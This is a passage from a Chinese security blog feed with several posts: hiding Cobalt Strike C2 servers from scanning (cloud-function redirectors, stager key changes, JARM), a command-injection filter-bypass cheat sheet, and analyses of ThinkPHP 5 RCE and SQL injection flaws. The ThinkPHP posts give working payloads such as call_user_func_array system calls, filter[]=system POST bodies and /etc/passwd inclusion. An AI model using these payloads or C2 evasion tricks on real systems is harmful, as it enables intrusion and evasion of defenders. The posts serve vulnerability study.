高可信白名单子域名（例如systemupdate.microsoft.com）</p><p>但是，真的是这样嘛？</p><p>放在以前，甚至半年前都是可行的。很多CDN提供商都不需要校验加速域名的所有权，或是如果回源IP为自家产品就不需要校验。但是现在以前常说的<code>CloudFront、Azure、CloudFlare、阿里云</code>等厂商都需要<a href="https://help.aliyun.com/document_detail/169377.html?spm=5176.11785003.overview.3.704c142fjv5nwd">验证域名归属权</a>了，需要向加速域名添加CNAME、TXT等记录来证明所有权，这样基本也就断了这条路子。</p><p>还有点小想法就是利用某些有子域控制权的服务、拿下一些软柿子DNS控制权、或者退而求其次注册些形如<code>mlcrosoft</code>的域名骗骗视力不好的管理员。</p><ul><li>也许还有不需要验证或是能Bypass的，只是笔者还没发现或是get到姿势</li></ul><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数简单的说就是云服务厂商已经搭建好了多种语言执行环境，我们只需要把代码通过Web传上去（或是在线编辑）就能执行。部署在云上自带CDN特效，只需要跑个转发代码就能被当作转发器用，即<code>目标机器 &lt;-&gt; 云函数CDN &lt;-&gt; CS服务器</code>。</p><p><img src="/img/jcyyccss_j.png"></p><p>各个厂商的云函数部署大同小异，具体方法可参考各家的文档。笔者特意测试了CS4.0是能正常上线并执行命令的，并不是一定得用CS4.1。除此之外中间其实踩了不少坑，挑几个可能比较普适的聊一下QAQ。</p><p><img src="/img/jcyyccss_k.png"></p><p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p><p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure><p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p><h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure><p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p><p><img src="/img/jcyyccss_l.png"></p><p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p><p><img src="/img/jcyyccss_m.png"></p><p>我们在浏览器中手动访问该路径会下载一个文件，随后可以利用固定的抑或密钥将其解密看个光光。</p><p><img src="/img/jcyyccss_n.png"></p><p>解决这个问题最方便的办法就是用完就把stager给kill掉，用的时候再编辑下Listener并保存就会重新开起来。</p><p><img src="/img/jcyyccss_o.png"></p><p>比较一劳永逸的办法就是反编译出class修改抑或字节并重新加密替换回去。已经有师傅改好了现成的，不过<code>0x3e</code>这个抑或字节迟早也会被加入解密全家桶，所以还是得团队自己改好一个自用的并将知道密钥的人咩口（误。之后再用<code>grab_beacon_config.nse</code>脚本去扫描，因为抑或密钥变了自然也就解析不出了。</p><p><img src="/img/jcyyccss_p.png"></p><h2 id="JA3-S-amp-JARM"><a href="#JA3-S-amp-JARM" class="headerlink" title="JA3/S &amp; JARM"></a>JA3/S &amp; JARM</h2><p>这是一类根据Java版本、Web服务器、TLS版本等多因素TLS握手包生成指纹的方法，具体介绍及工具可参考<a href="https://github.com/salesforce/jarm">jarm</a>。</p><p>目前主要用于识别的CS的JARM指纹是<code>07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</code>，利用这个指纹去识别其实也会包含不少像Tomcat、Weblogic这类的JavaWeb服务器。且该指纹是基于JDK11，如果用JDK13去跑CS则会得到不一样的指纹。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据对CS服务器的识别方式，主要可以分为主动扫描和被动识别，同时对每种标记方法介绍了相应的隐藏方法。像端口转发、CDN这类方法其实也可以组合使用，不过从实测的速度来看效果会很不理想。除此以外还有一些小套路比如让上线用的域名泛解析到同行（逃，像CloudFlare这种免费套餐不允许设置泛解析的就多加几条记录。</p><p>对于防守方来说，除了利用上述方法去识别没捂严实的CS服务器，可以考虑利用checksum8规则的特点给CS服务器疯狂假上线干扰攻击队，或者直接给各大杀软和沙箱批量交样本:(</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a></p><p><a href="http://www.feidao.site/wordpress/?p=4457">CobaltStrike流量规避和cdn配置</a></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/108027233">使用CobaltStrike搭建域前置</a></p><p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p><p><a href="https://lmntrix.com/lab/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/">Reflective Injection And Domain Fronting</a></p><p><a href="https://www.anquanke.com/post/id/224535">浅析CobaltStrike Beacon Staging Server扫描</a></p><p><a href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a></p><p><a href="https://sysopfb.github.io/malware,/cobaltstrike/2020/03/24/beacon-in-azure.html">Hiding in the clouds</a></p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a></p><p><a href="https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ">关于CobaltStrike的Stager被扫问题</a></p><p><a href="https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/">Analyzing Cobalt Strike for Fun and Profit</a></p><p><a href="https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/">A Red Teamer Plays with JARM</a></p><p><a href="https://www.anquanke.com/post/id/225627">利用JARM指纹进行TLS服务端标记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。&lt;/p&gt;
&lt;h2 id=&quot;默认端口&quot;&gt;&lt;a href=&quot;#默认端口&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="cs" scheme="https://hosch3n.github.io/tags/cs/"/>
    
    <category term="检测" scheme="https://hosch3n.github.io/tags/%E6%A3%80%E6%B5%8B/"/>
    
    <category term="伪装" scheme="https://hosch3n.github.io/tags/%E4%BC%AA%E8%A3%85/"/>
    
    <category term="端口" scheme="https://hosch3n.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
    <category term="tls" scheme="https://hosch3n.github.io/tags/tls/"/>
    
    <category term="cdn" scheme="https://hosch3n.github.io/tags/cdn/"/>
    
    <category term="stage" scheme="https://hosch3n.github.io/tags/stage/"/>
    
    <category term="ja3" scheme="https://hosch3n.github.io/tags/ja3/"/>
    
    <category term="jarm" scheme="https://hosch3n.github.io/tags/jarm/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令注入Bypass过滤</title>
    <link href="https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/"/>
    <id>https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/</id>
    <published>2020-11-21T02:56:10.000Z</published>
    <updated>2021-01-17T05:44:35.497Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><code>$&#123;IFS&#125;</code>在<code>man bash</code>手册中有介绍。它是一个字符串类型的分隔符集合，顾名思义就是用来定义分隔符的内置变量。通过<code>echo -n &quot;$IFS&quot; | hexdump</code>可以看到十六进制编码后的内部值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$IFS</span>&quot;</span> | hexdump</span><br><span class="line">0000000 0920 000a                              </span><br><span class="line">0000003</span><br></pre></td></tr></table></figure><p>不同的Linux发行版略有差异，主要是<code>0x09（\t）</code>、<code>0x20（空格）</code>、<code>0x0a（\n）</code>这三个默认值顺序的不同。它们三兄弟虽然紧挨在一起，但都是单独地起作用（即没有用来分割分隔符的分隔符）。IFS的值与<code>$*</code>、<code>$@</code>等内置变量也关系密切，通过将IFS赋空（NULL）可以实现一些特殊效果。在绕过时可以配合<code>$9</code>这个特殊空字符串</p><ul><li>重定向符：<code>cat&lt;&gt;flag</code>、<code>cat&lt;flag</code></li></ul><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>灵活运用<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>;</code>、<code>%0a（\n）</code>、<code>:</code>等符号</p><h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠"></a>过滤斜杠</h2><p>用<code>cd</code>配合命令分隔符</p><p>通过grep递归查找：<code>grep -ri . flag</code></p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>假设过滤<code>cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`c<span class="string">&#x27;&#x27;</span>at`</span><br><span class="line"></span><br><span class="line">`c<span class="string">&quot;&quot;</span>at`</span><br><span class="line"></span><br><span class="line">```ca``t```</span><br><span class="line"></span><br><span class="line">`ca\t`</span><br><span class="line"></span><br><span class="line">`x=ca;y=t;<span class="variable">$x</span><span class="variable">$y</span>`</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&#x27;Y2F0IGZsYWc=&#x27;</span>|base64 -d|sh`</span><br><span class="line"></span><br><span class="line">`bash -c <span class="string">&quot;&#123;echo, Y2F0IGZsYWc=&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 综合利用其它变量构造</span></span><br></pre></td></tr></table></figure><h2 id="无x权限的ELF"><a href="#无x权限的ELF" class="headerlink" title="无x权限的ELF"></a>无x权限的ELF</h2><p>利用动态加载器执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd readflag</span><br><span class="line"></span><br><span class="line">readelf -r readflag</span><br><span class="line"></span><br><span class="line">./lib64/ld-linux-x86-64.so.2 ./readflag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;过滤空格&quot;&gt;&lt;a href=&quot;#过滤空格&quot; class=&quot;headerlink&quot; title=&quot;过滤空格&quot;&gt;&lt;/a&gt;过滤空格&lt;/h2&gt;&lt;p&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;在&lt;code&gt;man bash&lt;/code&gt;手册中有介绍。它是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="linux" scheme="https://hosch3n.github.io/tags/linux/"/>
    
    <category term="bypass" scheme="https://hosch3n.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析代码执行篇</title>
    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
    <published>2020-11-05T11:51:12.000Z</published>
    <updated>2020-12-03T05:45:08.290Z</updated>
    
    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="rce" scheme="https://hosch3n.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析SQL注入篇</title>
    <link href="https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-21T13:12:12.000Z</published>
    <updated>2020-12-02T08:51:27.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p><ol start="0"><li>通过composer拉取项目</li></ol><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><ol><li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li><p>执行<code>composer update</code>更新项目</p></li><li><p>创建mysql数据库</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>配置<code>application/database.php</code>中对应参数</p></li><li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p></li><li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p></li></ol><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p><p><img src="/img/tp5ldfxsqli_a.png"></p><p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p><p><img 